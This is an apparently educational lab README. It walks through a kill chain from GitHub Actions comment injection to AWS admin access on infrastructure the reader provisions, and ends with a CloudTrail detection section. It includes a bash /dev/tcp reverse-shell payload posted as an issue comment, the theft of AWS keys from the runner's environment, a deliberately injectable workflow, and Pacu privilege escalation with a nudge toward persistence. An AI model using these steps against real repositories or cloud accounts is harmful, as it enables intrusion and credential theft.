# From the Pipes to the Clouds

Hack your way from Github Action pipelines to AWS!

## Abstract
This lab enables provisioning of all necessary infrastructure for demonstrating an attack scenario in which a threat actor starts by compromising a [*Github Action*](https://github.com/features/actions), performs lateral movement to an [*AWS*](https://aws.amazon.com/) account and, eventually, escalates privileges to aws administrator.  

Specifically, the attack comprises the following kill chain:  

1. Injection of a malicious comment into a Github issue to trigger a Github Action that initiates a reverse shell ([*Poisoned Pipeline Execution*](../../ci-cd/ppe/README.md)). 

2. Exfiltration of secrets from the action's runner via reverse shell, uncovering AWS keys.  

3. Enumeration of AWS resources using the previously extracted keys, revealing read access to the contents of an [*S3 bucket*](https://aws.amazon.com/pm/serv-s3).  

4. The bucket contains some files: the attacker uncover additional AWS keys.  

5. Leveraging these keys, the attacker employ [*Pacu*](https://github.com/RhinoSecurityLabs/pacu) to perform privilege escalation and gain admin access across the entire AWS account.  

![attack](./images/attack.png)  

This workshop will put you in the shoes of the attacker!  



## Prerequisites
- [*python*](https://www.python.org/downloads/)
- [*terraform*](https://www.terraform.io/)
- [*github*](https://github.com/) account
- [*aws*](https://aws.amazon.com/) account 
- [*ngrok*](https://ngrok.com/) account
- [*aws cli*](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)
- [*pacu*](https://github.com/RhinoSecurityLabs/pacu)

## INFRASTRUCTURE PROVISIONING

In order for the lab to work, you need to provision some infrastructure, in particular:

- a github repository
- some aws resources

You will use `terraform` for this task.  

### aws setup

First you will setup the required aws environment.  
You will create two *S3* buckets, one *CloudTrail trail* and two *IAM* users (along with required IAM policies).  


Move to the `infra/aws` directory and create a new file called `secret.tfvars`.  
This file will contain all the variables required to setup the aws environment: 

```sh
aws_region = "<your-aws-region-here>"
s3_bucket_lateral_movement_name ="<your-aws-s3-bucket-name-for-lateral-movement-demo-here>" # must be unique
s3_bucket_cloudtrail_name ="<your-aws-s3-bucket-name-for-cloudtrail-here>" # must be unique
```  

Now you can proceed with terraform provisioning (note, you need to have aws cli already installed and configured with sufficient rights for this step).  
Init the terraform module:  
```sh
terraform init
```  


Now launch a terraform plan by specifying the secret's file:  

```sh
terraform plan -var-file="secret.tfvars"
```  


If you are ok with the plan, apply it!

```sh
terraform apply -var-file="secret.tfvars"
```  

The previous command will take less than a minute to complete and will return the keys ID for the two IAM users:  
```sh
Apply complete! Resources: 9 added, 0 changed, 0 destroyed.

Outputs:

ppe_s3_readonly_access_key_id = "AKI*************"
ppe_s3_readonly_access_key_secret = <sensitive>
vulnerable_iam_access_key_id = "AKI*************"
vulnerable_iam_access_key_secret = <sensitive>
```  

Now you need to add the keys for the `vulnerable-iam-user` inside the local `repo-content` folder.  
In order to do that, open the `terraform.tfstate` file, retrieve both the access key ID and access key value for the `vulnerable-iam-user`  
and put them inside a file called `aws_keys.txt` inside the `repo-content` directory.  

Now is time to push that directory to the S3 bucket you created:  
```sh
aws s3 sync repo-content s3://s3-bucket-ppe-attack-demo-4421
```  

output of the previous command:  
```sh
upload: repo-content/README.md to s3://s3-bucket-ppe-attack-demo-4421/README.md
upload: repo-content/aws_keys.txt to s3://s3-bucket-ppe-attack-demo-4421/aws_keys.txt
upload: repo-content/test.py to s3://s3-bucket-ppe-attack-demo-4421/test.py
```  

The last thing you need to do is to get the secret access key id and value of the `ppe-s3-readonly-user` from  
the `terraform.tfstate` file, you will need them to setup the github repository in the next step!  




### github setup
Now that you've completed the creation of all required resources on aws, proceed with the github setup.  

This will create a repository with a Github Action that automatically prints the body of new comments added to existing issues.   

**Note**: for security reasons you will make the repository private but the same attack can be carried out against public repositories!  
This is what make this type of attack so dangerous: **the threat actor only needs to write a comment!**  

Move to the `infra/github` directory and create a new file called `secret.tfvars`.  
This file will contain all the secrets required to setup the github repository, as well as the aws keys for the `ppe-s3-readonly-user` (retrieved from the aws terraform step): 

```sh
gh_owner = "<your-github-account-or-org-here>"
gh_token="<your-github-pat-here>"
github_actions_secret_aws_key_id="<your-aws-secret-key-id-here>"
github_actions_secret_aws_key_value="<your-aws-secret-key-value-here>"
``` 

Init the terraform module:  
```sh
terraform init
```  


Now launch a terraform plan by specifying the secret's file:  

```sh
terraform plan -var-file="secret.tfvars"
```  


If you are ok with the plan, apply it!

```sh
terraform apply -var-file="secret.tfvars"
```  

The previous command will take less than a minute to complete and will return the url of the new repo, in my case:  
```sh
Apply complete! Resources: 5 added, 0 changed, 0 destroyed.

Outputs:

repository_url = "https://github.com/R3DRUN3/ppe"
```  

navigate to that url and check that everything is ok, you should find a repository like this:  


![repo-created](./images/repo-created.png)  


You will also find the following issue on that repo:  
![issue-created](./images/issue-created.png)  



Now you can proceed with the attack! 💪

<br/>

## ATTACK DEMONSTRATION 

>**NOTE**  
>Before we begin our attack simulation, it's important to emphasize that, while we will demonstrate each step manually and sequentially,  
>real-world *Advanced Persistent Threats* (APTs) employ sophisticated techniques and automation (such as botnets and scripts)  
> that can enable them to complete the entire Cyber Kill Chain demonstrated here in less than a minute.  
>One such technique involves automating the monitoring of newly created public repositories on GitHub.  
>The list of these repositories can be obtained, for instance, using the following command:  
```sh
curl -L \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/events | jq '[.[] | select(.type == "CreateEvent")]'
```  

### The Attack Begins

Add a new comment to the issue:  

![first-comment](./images/first-comment.png)  

Observe that the github action has been triggered by your comment:  
![first-action](./images/first-action.png)  


As an attacker, seeing that issue (**THIS REPO IS NOT SAFE**) makes you suspicious and you proceed to scan the repo with [*poutine*](https://github.com/boostsecurityio/poutine):  
```sh
docker run -e GH_TOKEN ghcr.io/boostsecurityio/poutine:latest analyze_repo r3drun3/ppe
```  

From the output you read:  
```console
Rule: Injection with Arbitrary External Contributor Input
Severity: warning
Description: The pipeline contains an injection into bash or JavaScript with an expression 
that can contain user input. Prefer placing the expression in an environment variable 
instead of interpolating it directly into a script.
Documentation: https://boostsecurityio.github.io/poutine/rules/injection

+-------------+--------------------------------+---------------------------------------------------------------------------+
| REPOSITORY  |            DETAILS             |                                    URL                                    |
+-------------+--------------------------------+---------------------------------------------------------------------------+
| r3drun3/ppe | .github/workflows/issue.yaml   | https://github.com/r3drun3/ppe/tree/HEAD/.github/workflows/issue.yaml#L10 |
|             | Job: auto-manage-new-issue     |                                                                           |
|             | Step: 0                        |                                                                           |
|             | Sources:                       |                                                                           |
|             | github.event.comment.body      |                                                                           |
|             |                                |                                                                           |
+-------------+--------------------------------+---------------------------------------------------------------------------+
```  

So you inspect the github action:  

```yaml
name: issue comment workflow
on:
  issue_comment:
    types: [created]
jobs:
  auto-manage-new-issue:
    runs-on: ubuntu-latest
    steps:
      - name: Retrieve Issue Information
        run: |
          echo "NEW ISSUE COMMENT ✍️" && echo ${{ github.event.comment.body }}
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```  

and you notice that they are echoing the content of the issue body (`${{ github.event.comment.body }}`) without sanitizing it! 

Maybe there is a way to pipe malicious commands by simply commenting on that issue 🤔  

At this point you can proceed to poison the execution 😈  

In order to do that you can use [*ngrok*](https://ngrok.com/) (you can also use [*Cloudflare Tunnels*](https://www.cloudflare.com/products/tunnel/) or whatever tool fit the need to seamlessy expose a local service to the internet).  


Open a new nectcat listener on your local machine:  
```sh
nc -lnvp 1337
```  

Forward an ngrok tcp tunnel on the same port: 

```sh
ngrok tcp 1337
```  

Now, retrieve the `Forwarding` address (DNS name) from ngrok output and execute a dns lookup in order to obtain the public IP.  

Our payload will be:  
```console
"" && bash -i >& /dev/tcp/<NGROK-IP-HERE>/<NGROK-PORT-HERE> 0>&1
```  

![evil-comment](./images/evil-comment.png)  


This command sets up a reverse shell from a target machine (github action runner) to a listening server (the attacker's machine).   
Let's break down what each part of the command does:

 
1. `bash -i`: Launches an interactive Bash shell (`-i` flag).
 
2. `>& /dev/tcp/<NGROK-IP-HERE>/<NGROK-PORT-HERE>`: Redirects both stdout and stderr of the Bash shell to a TCP connection to `<NGROK-IP-HERE>` on `<NGROK-PORT-HERE>`.  
  Here's how this redirection works:  
  - `>&` combines the stdout (`1`) and stderr (`2`) streams.
 
  - `/dev/tcp/` is a special device in Unix-like systems that allows Bash to open a TCP connection to `<NGROK-IP-HERE>` at `<NGROK-PORT-HERE>`.
 
3. `0>&1`: Redirects stdin (file descriptor `0`) to the same place as stdout (file descriptor `1`). This ensures that all input and output from the Bash shell session are sent over the network connection established with NGROK.



Now you have a remote shell on the runner!  


```console
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40158
bash: cannot set terminal process group (469): Inappropriate ioctl for device
bash: no job control in this shell
runner@fv-az1655-134:~/work/ppe/ppe$ whoami
runner
runner@fv-az1655-134:~/work/ppe/ppe$ id
uid=1001(runner) gid=127(docker) groups=127(docker),4(adm),101(systemd-journal)
```   

At this point you have access to that runner environment and you find some aws keys!    

```sh
runner@fv-az1655-134:~/work/ppe/ppe$ env | grep AWS

AWS_SECRET_ACCESS_KEY=kG***************************************
AWS_ACCESS_KEY_ID=AK*****************
```  

save those keys and close the reverse shell:

**AWS ENUMERATION BEGIN!**  




Export those keys in order to use them with the aws cli:  
```sh
export AWS_ACCESS_KEY_ID=AK*****************
export AWS_SECRET_ACCESS_KEY=kG***************************************
```  

Now retrieve information about your current aws identity:  
```sh
aws sts get-caller-identity
```  

Output:  
```json
{
    "UserId": "<USER-ID-HERE>",
    "Account": "<ACCOUNT-ID-HERE>",
    "Arn": "arn:aws:iam::<ACCOUNT-ID-HERE>:user/ppe-s3-readonly-user"
}
```  

From this you learn that your current user is called `ppe-s3-readonly-user`.  


Try to retrieve more info about the current user:  
```sh
aws iam get-user --user-name ppe-s3-readonly-user
``` 

Output: 
```sh
An error occurred (AccessDenied) when calling the GetUser operation: User: arn:aws:iam:user/ppe-s3-readonly-user is not authorized to perform: iam:GetUser on resource: user ppe-s3-readonly-user because no identity-based policy allows the iam:GetUser action
```  


Let's try to list the attached policies for our user:  
```sh
aws iam list-attached-user-policies --user-name ppe-s3-readonly-user
```  

Output:  
```sh
An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam:user/ppe-s3-readonly-user is not authorized to perform: iam:ListAttachedUserPolicies on resource: user ppe-s3-readonly-user because no identity-based policy allows the iam:ListAttachedUserPolicies action
```  

Seems like your current user does not have grants to call these basic aws api...however the user name can be an indication, let's try to list S3 buckets:  

```sh
aws s3api list-buckets
```  

Output:  
```json
{
    "Buckets": [
        {
            "Name": "s3-bucket-ppe-attack-demo-4421",
            "CreationDate": "2024-07-11T11:28:34.000Z"
        }
    ],
    "Owner": {
        "ID": "f3701bace7c0f6dce6360e5d34bd3b6ef364e7609eb8fc12d413add19d993b73"
    }
}
```  

Yes! you are able to list a bucket!  
Can you also download its content?  

```sh
aws s3 sync s3://s3-bucket-ppe-attack-demo-4421 ./s3-download
```  

Output:  
```sh
download: s3://s3-bucket-ppe-attack-demo-4421/test.py to s3-download/test.py
download: s3://s3-bucket-ppe-attack-demo-4421/aws_keys.txt to s3-download/aws_keys.txt
download: s3://s3-bucket-ppe-attack-demo-4421/README.md to s3-download/README.md
```  
You can!
and you also see that there is a file called `aws_keys.txt`  

Inside that file other aws access keys, export those and begin enumeration for the new user:  
```sh
aws sts get-caller-identity
```  

Output:  
```json
{
    "UserId": "<USER-ID-HERE>",
    "Account": "<ACCOUNT-ID-HERE>",
    "Arn": "arn:aws:iam::<ACCOUNT-ID-HERE>:user/vulnerable-iam-user"
}
```  

Our new user is called `vulnerable-iam-user`, lets list it's policies:  
```sh
aws iam list-user-policies --user-name vulnerable-iam-user
```  

Output:  
```json
{
    "PolicyNames": [
        "vulnerable-iam-policy"
    ]
}
```  

This is the policy:  

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Action": [
                "iam:Get*",
                "iam:List*",
                "iam:Put*",
                "iam:SimulateCustomPolicy",
                "iam:SimulatePrincipalPolicy"
            ],
            "Resource": "*"
        }
    ]
}
```  

It is a very permissive policy (it uses wildcards '*') and so maybe there is a way to achieve privilege escalation.  
To check for escalation paths you can use [*Pacu*](https://github.com/RhinoSecurityLabs/pacu), the aws exploitation framework!  

Launch the tool:  
```console
❯ pacu

 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣉⣙⣛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠿⢿⣿⣷⣦⣄⠀⠀⠈⠛⠋⠀⠀⠀⠈⠻⣿⣷⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⣤⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣆⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣬⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣉⣉⣡⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣶⣄⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⣤⣶⡿⣿⣿⠉⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣧⡀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⣶⣿⡟⠻⣿⠃⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧
 ⢀⣀⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣾⣿⠉⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
 ⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡟
 ⠀⠀⠀⠀⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁
 ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⣴⣆⢀⣴⣆⠀⣼⣆⠀⠀⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠋⠀⠀
 ⠀⠀⠀⣼⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀
 ⠀⠀⠀⣿⣿⠟⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣶⡀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣆⠀⢰⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠘⠁⠀⠀⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢿⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⣿⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠸⠿⠿⠟⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢀⣀⣀⣀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⠀⠀⠀⢸⣿⣿⡏⠉⠉⢹⣿⣿⡇⠀⢸⣿⣿⣇⣀⣀⣸⣿⣿⣿⠀⢸⣿⣿⣿⣀⣀⣀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀

Version: 1.6.0
```  

set access keys, you will use the keys of the `vulnerable-iam-user`:

```console
Pacu (first:No Keys Set) > set_keys
Setting AWS Keys...
Press enter to keep the value currently stored.
Enter the letter C to clear the value, rather than set it.
If you enter an existing key_alias, that key's fields will be updated instead of added.
Key alias must be at least 2 characters

Key alias [None]: vulnerable
Access key ID [None]: <ACCESS-KEY-ID-HERE>
Secret access key [None]: <SECRET-ACCESS-KEY-HERE>
Session token (Optional - for temp AWS keys only) [None]: 

Keys saved to database. 
```  

Check yuour current Pacu identity:  

```sh
whoami
```  

```json
{
  "UserName": null,
  "RoleName": null,
  "Arn": null,
  "AccountId": null,
  "UserId": null,
  "Roles": null,
  "Groups": null,
  "Policies": null,
  "AccessKeyId": "AK************",
  "SecretAccessKey": "vB***********************************",
  "SessionToken": null,
  "KeyAlias": "vulnerable",
  "PermissionsConfirmed": null,
  "Permissions": {
    "Allow": {},
    "Deny": {}
  }
}
```  

list all available pacu commands with `ls`.  
You want to check for IAM Privilege escalation paths:  
```sh
help iam__privesc_scan
```  

Execute the `run iam__privesc_scan` command to scan for permission misconfigurations in the environment and see what privilege escalation vectors might be available.  
Select "y" when prompted to run the module `iam__enum_permissions`.  

Output:  
```console
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   CONFIRMED: PutGroupPolicy
[iam__privesc_scan]   CONFIRMED: PutUserPolicy
[iam__privesc_scan] Attempting confirmed privilege escalation methods...

[iam__privesc_scan] Trying to add an administrator policy to the current user...

[iam__privesc_scan]   Successfully added an inline policy named hdnby1gqhk! You should now have administrator permissions.


[iam__privesc_scan] iam__privesc_scan completed.

[iam__privesc_scan] MODULE SUMMARY:

  Privilege escalation was successful
```   

Yes! you succesfully attached an admin policy called `hdnby1gqhk` to  our vulnerable user, you can inspect it from the aws console:  

![admin-policy](./images/admin-policy.png)  

If you type `whoami` once again in the pacu console, you will see much more grants than before!  

With this new policy you can basically do whatever you want across all aws resources 😈 😈 😈 

As an attacker your job here is done!    
Now you can basically do whatever you want on the aws account, do not forget to implement some persistence mechanism like creating new resources (lambda functions, users, roles etc.).  

## Bonus: DEFENSE


Detecting *lateral movement* and *privilege escalation* on AWS can be effectively achieved by analyzing [*CloudTrail*](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html) logs, which capture API calls and user activities across your AWS environment.  
Blue teams can leverage services and integrations like for real-time analysis and visualization of CloudTrail data.  
By setting up specific queries, security analysts can identify anomalous patterns, such as unusual cross-account access, unexpected instance launches, or excessive permission changes.  
The [*integration of CloudTrail with ElasticSearch*](https://www.elastic.co/docs/current/integrations/aws/cloudtrail), for example, enables efficient searching and alerting on potential security threats, allowing teams to respond swiftly to suspicious activities indicative of lateral movement or privilege escalation attempts.  


Via the `vulnerable-iam-user` user, let's check if there are some active trails.  
A *trail* is a user-created audit definition that can capture one or more types of events.  
Unlike Event history, CloudTrail trail logs are not limited to 90 days of retention.  
They can be delivered to an S3 bucket or AWS CloudWatch Logs and configured to send SNS notifications when a particular event happens:  

```sh
aws cloudtrail describe-trails
```  

output:  
```json
{
    "trailList": [
        {
            "Name": "detection",
            "S3BucketName": "s3-bucket-cloudtrail-attack-demo-3412",
            "S3KeyPrefix": "prefix",
            "IncludeGlobalServiceEvents": true,
            "IsMultiRegionTrail": false,
            "HomeRegion": "eu-north-1",
            "TrailARN": "arn:aws:cloudtrail:eu-north-1:<account-id-here>:trail/detection",
            "LogFileValidationEnabled": false,
            "HasCustomEventSelectors": false,
            "HasInsightSelectors": false,
            "IsOrganizationTrail": false
        }
    ]
}
```  

There is one trail.   


Retrieve the cloudtrail events associated to both the `ppe-s3-readonly-user` and the `vulnerable-iam-user` users (modify the timespan for the filter):  

```sh
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=ppe-s3-readonly-user --start-time "2024-07-16T00:00:00Z" --end-time "2024-07-16T23:59:59Z" | jq
```  

```sh
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=vulnerable-iam-user --start-time "2024-07-16T00:00:00Z" --end-time "2024-07-16T23:59:59Z" | jq
```

This will retrieve our recents actions on the aws account with those users.  


# The End 😊 👋  



**WARNING**: For security reasons, once you have completed the lab, remember to destroy the infrastructure  
you created by launching the `terraform destroy -var-file="secret.tfvars"` both in `infra\github` and `infra\aws` folders. 


